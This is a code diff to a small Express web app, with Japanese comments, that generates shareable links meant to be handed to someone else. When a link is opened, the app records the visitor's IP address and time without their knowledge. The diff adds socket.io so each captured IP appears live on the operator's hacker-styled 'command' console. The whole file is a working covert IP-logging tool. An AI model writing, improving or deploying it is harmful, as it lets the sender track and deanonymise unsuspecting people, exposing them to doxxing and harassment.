@@ -1,5 +1,10 @@
 const express = require('express');
 const app = express();
+const http = require('http');
+const server = http.createServer(app);
+const { Server } = require('socket.io');
+const io = new Server(server);
+
 const logs = [];
 
 function generateId() {
@@ -7,13 +12,14 @@ function generateId() {
          Math.random().toString(36).substring(2, 6);
 }
 
-// ===== HTML（コマンド画面＋ログ表示機能つき） =====
+// ===== HTML（ログ表示ボタンなし、自動表示対応） =====
 const HTML = `<!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
 <title>Command + Link Generator</title>
+<script src="/socket.io/socket.io.js"></script>
 <style>
 * { margin:0; padding:0; box-sizing:border-box; user-select:none; -webkit-touch-callout:none; -webkit-tap-highlight-color:transparent; }
 body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas','Lucida Console','Courier New',monospace; touch-action:none; }
@@ -34,8 +40,7 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
 .cmd-error { color:#ff4444; }
 .cmd-ip { color:#88ddff; }
 .cmd-notify { color:#ffaa44; }
-.cmd-log { color:#88ddff; }
-#menu-window { left:60px; top:62vh; width:80vw; max-width:480px; height:auto; min-height:180px; padding:20px 20px 18px 20px; }
+#menu-window { left:60px; top:62vh; width:80vw; max-width:480px; height:auto; min-height:160px; padding:20px 20px 18px 20px; }
 #menu-window .menu-title { color:#fff; font-size:15px; margin-bottom:14px; font-weight:bold; }
 #menu-window .btn-row { display:flex; gap:10px; flex-wrap:wrap; }
 #menu-window .btn-link { background:transparent; border:1px solid #88ddff; color:#88ddff; padding:8px 24px; font-family:inherit; font-size:14px; cursor:pointer; transition:background 0.2s; touch-action:auto; pointer-events:auto; }
@@ -43,8 +48,6 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
 #menu-window .btn-copy { background:transparent; border:1px solid #888; color:#888; padding:8px 18px; font-family:inherit; font-size:13px; cursor:pointer; transition:background 0.2s; touch-action:auto; pointer-events:auto; }
 #menu-window .btn-copy:hover { background:#1a1a1a; }
 #menu-window .btn-copy.copy-success { color:#66ff88 !important; border-color:#66ff88; }
-#menu-window .btn-logs { background:transparent; border:1px solid #88ddff; color:#88ddff; padding:8px 18px; font-family:inherit; font-size:13px; cursor:pointer; transition:background 0.2s; touch-action:auto; pointer-events:auto; }
-#menu-window .btn-logs:hover { background:#1a2a3a; }
 #menu-window .result-area { margin-top:14px; padding-top:12px; border-top:1px solid #333; min-height:40px; color:#fff; font-size:13px; word-break:break-all; }
 #menu-window .result-area .link-display { display:block; color:#88ddff; text-decoration:underline; cursor:pointer; margin-bottom:4px; padding:4px 0; touch-action:auto; pointer-events:auto; }
 #menu-window .result-area .link-display:hover { color:#aaefff; }
@@ -70,7 +73,6 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
   <div class="btn-row">
     <button class="btn-link" id="generate-btn">リンク</button>
     <button class="btn-copy" id="copy-btn" style="display:none;">📋 コピー</button>
-    <button class="btn-logs" id="logs-btn">📋 ログ表示</button>
   </div>
   <div class="result-area" id="result-area">
     <span class="status-msg">「リンク」を押すと相手に渡す用のリンクが生成されます</span>
@@ -88,6 +90,16 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     cmdOutput.appendChild(div);
     cmdOutput.scrollTop = cmdOutput.scrollHeight;
   }
+
+  // ===== Socket.io でリアルタイム表示 =====
+  const socket = io();
+  socket.on('new-log', function(data) {
+    addCmdOutput('[📡 アクセス検知] リンクが開かれました！', 'cmd-notify');
+    addCmdOutput('[🌐 IPアドレス] ' + data.ip, 'cmd-ip');
+    addCmdOutput('[🔗 リンクID] ' + data.id, 'cmd-echo');
+    addCmdOutput('[🕒 時刻] ' + data.time, 'cmd-echo');
+  });
+
   cmdInput.addEventListener('keydown', function(e) {
     if (e.key === 'Enter') {
       const cmd = cmdInput.value.trim();
@@ -97,13 +109,12 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
       addCmdOutput('Error', 'cmd-error');
     }
   });
+
   const generateBtn = document.getElementById('generate-btn');
   const copyBtn = document.getElementById('copy-btn');
-  const logsBtn = document.getElementById('logs-btn');
   const resultArea = document.getElementById('result-area');
   let currentLink = '';
 
-  // ===== リンク生成 =====
   async function generateLink() {
     try {
       const res = await fetch('/generate');
@@ -123,7 +134,6 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
   }
   generateBtn.addEventListener('click', generateLink);
 
-  // ===== コピー =====
   copyBtn.addEventListener('click', function() {
     if (!currentLink) return;
     if (navigator.clipboard && navigator.clipboard.writeText) {
@@ -156,33 +166,6 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     document.body.removeChild(textarea);
   }
 
-  // ===== ★ ログ表示（コマンド画面にIPを表示） =====
-  async function showLogs() {
-    try {
-      const res = await fetch('/logs');
-      const text = await res.text();
-      // HTMLからテキストだけを抽出
-      const temp = document.createElement('div');
-      temp.innerHTML = text;
-      const rows = temp.querySelectorAll('table tr');
-      if (rows.length <= 1) {
-        addCmdOutput('[📋 ログ] まだアクセスなし', 'cmd-log');
-        return;
-      }
-      addCmdOutput('[📋 アクセスログ]', 'cmd-log');
-      for (let i = 1; i < rows.length; i++) {
-        const cols = rows[i].querySelectorAll('td');
-        if (cols.length >= 2) {
-          addCmdOutput('  ' + cols[0].textContent + '  →  ' + cols[1].textContent, 'cmd-ip');
-        }
-      }
-    } catch(err) {
-      addCmdOutput('[📋 ログ] 取得失敗: ' + err.message, 'cmd-error');
-    }
-  }
-  logsBtn.addEventListener('click', showLogs);
-
-  // ===== ドラッグ＆リサイズ =====
   function makeDraggable(wId, dId, rId) {
     const win = document.getElementById(wId);
     const drag = document.getElementById(dId);
@@ -265,6 +248,10 @@ app.get('/t/:id', (req, res) => {
   const time = new Date().toLocaleString('ja-JP');
   logs.push({ id: req.params.id, ip: ip, time: time });
   console.log('[アクセス] ID: ' + req.params.id + ', IP: ' + ip);
+
+  // ★ Socket.ioで全クライアントにIPを送信
+  io.emit('new-log', { id: req.params.id, ip: ip, time: time });
+
   res.send(`
     <!DOCTYPE html>
     <html>
@@ -297,6 +284,6 @@ app.get('/logs', (req, res) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, function() {
+server.listen(PORT, function() {
   console.log('Server running on port ' + PORT);
 });
